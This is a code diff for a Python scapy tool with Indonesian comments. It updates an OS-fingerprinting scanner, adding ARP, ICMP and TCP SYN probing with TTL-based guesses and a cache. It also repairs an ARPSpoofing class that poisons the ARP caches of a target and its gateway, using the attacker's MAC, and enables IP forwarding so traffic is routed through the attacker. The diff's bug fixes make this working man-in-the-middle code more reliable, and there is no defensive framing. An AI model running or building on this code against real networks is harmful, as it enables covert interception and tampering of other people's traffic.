@@ -1,4 +1,4 @@
-from scapy.all import srp, Ether, ARP, conf, sniff, IP, TCP, UDP, Raw, PcapWriter, send, sr1, ICMP
+from scapy.all import srp, Ether, ARP, conf, sniff, IP, TCP, UDP, Raw, PcapWriter, send, sr1, ICMP, RandShort, sendp, get_if_hwaddr
 from scapy.utils import PcapWriter
 from scapy.data import ETHER_TYPES, MANUFDB
 import socket
@@ -12,6 +12,10 @@ import time
 from getmac import get_mac_address
 
 conf.use_pcap = True
+
+# Simple in-memory cache to avoid excessive probing causing RTO/rate limiting
+_OS_CACHE = {}
+_OS_CACHE_TTL_SEC = 30  # cache per IP for 30 seconds
 
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -33,52 +37,126 @@ def get_gateway_ip():
     gateway = conf.route.route("0.0.0.0")[2]
     return gateway
 
-def os_fingerprint(ip):
+def os_fingerprint(ip, iface: Optional[str] = None):
+    """
+    Fingerprint OS heuristically using TTL from ICMP Echo Reply or TCP responses.
+    - First try ICMP echo (ping) with a slightly longer timeout.
+    - If ICMP fails (RTO or blocked), fall back to TCP SYN on common ports.
+    - If device is in the same LAN and ARP replies, consider host 'up' even if TTL couldn't be measured.
+    """
+    # Cache check
     try:
-        pkt = IP(dst=ip)/ICMP()
-        ans = sr1(pkt, timeout=2, verbose=False)
-        
+        cache = _OS_CACHE.get(ip)
+        if cache and (time.time() - cache.get('ts', 0)) < _OS_CACHE_TTL_SEC:
+            return cache['data']
+    except Exception:
+        pass
+
+    # First, try ARP to quickly determine local reachability on the same LAN
+    arp_reachable = False
+    try:
+        conf.verb = 0
+        arp_ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=1.0, retry=0, iface=iface)
+        if arp_ans and len(arp_ans) > 0:
+            arp_reachable = True
+    except Exception:
+        # Ignore ARP errors; continue with ICMP/TCP methods
+        pass
+    def _ttl_to_guess(ttl: int):
+        if ttl is None:
+            return (None, None, "Unknown")
+        if ttl > 128:
+            initial = 255
+        elif ttl > 64:
+            initial = 128
+        else:
+            initial = 64
+        hops = initial - ttl if ttl is not None else None
+        os_guess = "Unknown"
+        if initial == 64:
+            os_guess = "Linux/Unix/Mac"
+        elif initial == 128:
+            os_guess = "Windows"
+        elif initial == 255:
+            os_guess = "Network Devices"
+        return (initial, hops, os_guess)
+
+    try:
+        # Try ICMP echo first (some systems block ICMP; increase timeout & allow 2 attempts)
+        icmp_pkt = IP(dst=ip)/ICMP()
+        ans = sr1(icmp_pkt, timeout=1.5, verbose=False, iface=iface)
         if not ans:
-            return {'ip': ip, 'status': 'down'}
-        
+            # Second attempt in case of transient loss
+            ans = sr1(icmp_pkt, timeout=1.5, verbose=False, iface=iface)
+
         if ans:
             icmp_layer = ans.getlayer(ICMP)
-            if icmp_layer.type == 0:
-                ttl = ans.ttl
-                
-                if ttl > 128:
-                    initial_ttl = 255
-                elif ttl > 64:
-                    initial_ttl = 128
-                else:
-                    initial_ttl = 64
-                    
-                hops = initial_ttl - ttl
-                
-                mac = get_mac_address(ip=str(ip), network_request=True)
-                
-                os_guest = "Unknown"
-                if initial_ttl == 64:
-                    os_guest = "Linux/Unix/Mac"
-                elif initial_ttl == 128:
-                    os_guest = "Windows"
-                elif initial_ttl == 255:
-                    os_guest = "Network Devices"
-                
-                return {
+            if icmp_layer and icmp_layer.type == 0:  # Echo reply
+                ttl = getattr(ans, 'ttl', None)
+                initial_ttl, hops, os_guess = _ttl_to_guess(ttl)
+                result = {
                     'ip': ip,
                     'ttl': ttl,
                     'initial_ttl': initial_ttl,
                     'hops': hops,
-                    'os': os_guest,
-                    'status': 'up',
-                    'mac': mac
+                    'os': os_guess,
+                    'status': 'up'
                 }
-            elif icmp_layer.type == 3:
-                return {'ip': ip, 'status': 'uncherable'}
-            
+                _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
+                return result
+            elif icmp_layer and icmp_layer.type == 3:  # Destination unreachable
+                # Keep legacy status string used by frontend
+                result = {'ip': ip, 'status': 'uncherable'}
+                _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
+                return result
+
+        # Fallback: TCP SYN to common ports; even RST implies host is up
+        for dport in (443, 80, 22, 53, 445, 139):
+            tcp_pkt = IP(dst=ip)/TCP(sport=RandShort(), dport=dport, flags='S')
+            resp = sr1(tcp_pkt, timeout=1.5, verbose=False, iface=iface)
+            if not resp:
+                continue
+            ttl = getattr(resp, 'ttl', None)
+            initial_ttl, hops, os_guess = _ttl_to_guess(ttl)
+            # Check flags: SA (open) or RA/R (closed) still means host reachable
+            tcp_layer = resp.getlayer(TCP)
+            if tcp_layer:
+                flags = tcp_layer.flags
+                # Responded: consider host up
+                result = {
+                    'ip': ip,
+                    'ttl': ttl,
+                    'initial_ttl': initial_ttl,
+                    'hops': hops,
+                    'os': os_guess,
+                    'status': 'up',
+                    'port': dport,
+                    'tcp_flags': int(flags)
+                }
+                _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
+                return result
+
+        # If ARP responded but we couldn't get TTL via ICMP/TCP, still mark host as up
+        if arp_reachable:
+            result = {
+                'ip': ip,
+                'ttl': None,
+                'initial_ttl': None,
+                'hops': None,
+                'os': 'Unknown',
+                'status': 'up'
+            }
+            _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
+            return result
+
+        # No response from ICMP or TCP (and ARP didn't respond)
+        result = {'ip': ip, 'status': 'down'}
+        _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
+        return result
     except Exception as e:
-        return {'ip': ip, 'status': 'error', 'error': str(e)}
+        result = {'ip': ip, 'status': 'error', 'error': str(e)}
+        _OS_CACHE[ip] = { 'ts': time.time(), 'data': result }
+        return result
 
 def get_hostname(ip):
     try:
@@ -438,14 +516,15 @@ class ARPSpoofing:
         # Var untuk menyimpan MAC
         self.target_mac = None
         self.gateway_mac = None
+        self.attacker_mac = None
         
-        # Control Flag
-        self._runnning = False
+        # Control Flags
+        self._running = False
         self._poisoned = False
         
         # Threading
         self._thread = None
-        self._lock = False
+        self._lock = threading.Lock()
         
         conf.verb = 0
         
@@ -465,14 +544,18 @@ class ARPSpoofing:
 
         
     def _spoof(self, target_ip: str, spoof_ip: str, target_mac: str):
-        packet = ARP(op=2, # ARP reply
-                     pdst=target_ip, # Target IP
-                     hwdst=target_mac, # Target MAC
-                     psrc=spoof_ip) #source ip
-                    
-                    #hwsrc adalah mac kita
-        
-        send(packet, iface=self.iface, verbose=False)
+        """Kirim ARP 'is-at' yang memberitahu target bahwa spoof_ip berada pada MAC penyerang."""
+        # Tentukan MAC penyerang (hwsrc) secara eksplisit
+        hwsrc_val = self.attacker_mac
+        try:
+            if not hwsrc_val and self.iface:
+                hwsrc_val = get_if_hwaddr(self.iface)
+        except Exception:
+            hwsrc_val = None
+
+        arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=hwsrc_val)
+        eth = Ether(dst=target_mac)
+        sendp(eth/arp, iface=self.iface, verbose=False)
      
     def _restore(self, dest_ip: str, source_ip: str, dest_mac: str, source_mac: str):   
         packet = ARP(op=2, # ARP reply
@@ -488,6 +571,7 @@ class ARPSpoofing:
             with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                 f.write("1\n")
                 self._log("[ARPSpoofing] ✓ IP forwarding enabled")
+            return True
         except Exception as e:
             self._log(f"[ARPSpoofing] ✗ Failed to enable IP forwarding: {e}")
             self._log("  Try manually: echo 1 > /proc/sys/net/ipv4/ip_forward")
@@ -498,6 +582,7 @@ class ARPSpoofing:
             with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                 f.write("0\n")
                 self._log("[ARPSpoofing] ✓ IP forwarding disabled")
+            return True
         except Exception as e:
             self._log(f"[ARPSpoofing] ✗ Failed to disable IP forwarding: {e}")
             self._log("  Try manually: echo 0 > /proc/sys/net/ipv4/ip_forward")
@@ -509,10 +594,14 @@ class ARPSpoofing:
         
         while self._running:
             try:
-                # Poison target
+                # Poison target: beritahu target bahwa gateway_ip adalah MAC kita
                 self._spoof(self.target_ip, self.gateway_ip, self.target_mac)
-                # Poison gateway
+                print(f"[ARPSpoofing] Telling {self.target_ip} that {self.gateway_ip} is-at {self.attacker_mac} (dst {self.target_mac})")
+                self._log(f"[ARPSpoofing] ✓ Telling {self.target_ip} that {self.gateway_ip} is-at {self.attacker_mac} (dst {self.target_mac})")
+                # Poison gateway: beritahu gateway bahwa target_ip adalah MAC kita
                 self._spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
+                print(f"[ARPSpoofing] Telling {self.gateway_ip} that {self.target_ip} is-at {self.attacker_mac} (dst {self.gateway_mac})")
+                self._log(f"[ARPSpoofing] ✓ Telling {self.gateway_ip} that {self.target_ip} is-at {self.attacker_mac} (dst {self.gateway_mac})")
                 
                 packet_count += 2
                 self._log(f"[ARPSpoofing] Sent {packet_count} ARP packets...")
@@ -523,7 +612,7 @@ class ARPSpoofing:
                 self._log(f"[ARPSpoofing] Error in poison loop: {e}")
                 break
         
-            self._log("[ARPSpoofing] Poison loop stopped")
+        self._log("[ARPSpoofing] Poison loop stopped")
     
     def start(self, enable_forwarding: bool = True, background: bool = True) -> dict:
         with self._lock:
@@ -540,6 +629,12 @@ class ARPSpoofing:
             # Get MAC addresses
             self.target_mac = str(get_mac_address(ip=str(self.target_ip), network_request=True))
             self.gateway_mac = str(get_mac_address(ip=str(self.gateway_ip), network_request=True))
+            # Ambil MAC penyerang dari interface aktif jika tersedia
+            try:
+                if self.iface:
+                    self.attacker_mac = str(get_mac_address(interface=str(self.iface)))
+            except Exception:
+                self.attacker_mac = None
 
             if not self.target_mac or self.target_mac == "None":
                 msg = f"Could not find target MAC for {self.target_ip}"
@@ -561,15 +656,11 @@ class ARPSpoofing:
                     "thread": None
                 }
 
-            # Enable IP forwarding
+            # Enable IP forwarding (best-effort; continue even if failed, e.g., on macOS)
             if enable_forwarding:
-                if not self.enable_ip_forwarding():
-                    return {
-                        "success": False,
-                        "message": "Failed to enable IP forwarding",
-                        "is_running": False,
-                        "thread": None
-                    }
+                ok = self.enable_ip_forwarding()
+                if ok is False:
+                    self._log("[ARPSpoofing] ⚠ Continuing without IP forwarding (may limit packet routing)")
 
             # Set flags
             self._running = True
@@ -587,6 +678,8 @@ class ARPSpoofing:
                 self._log(f"\\n[ARPSpoofing] ✓ Poisoning started in background thread!")
                 self._log(f"  Target: {self.target_ip} ({self.target_mac})")
                 self._log(f"  Gateway: {self.gateway_ip} ({self.gateway_mac})")
+                if self.attacker_mac:
+                    self._log(f"  Attacker MAC: {self.attacker_mac} (iface: {self.iface})")
                 self._log(f"  Interval: {self.interval}s")
 
                 return {
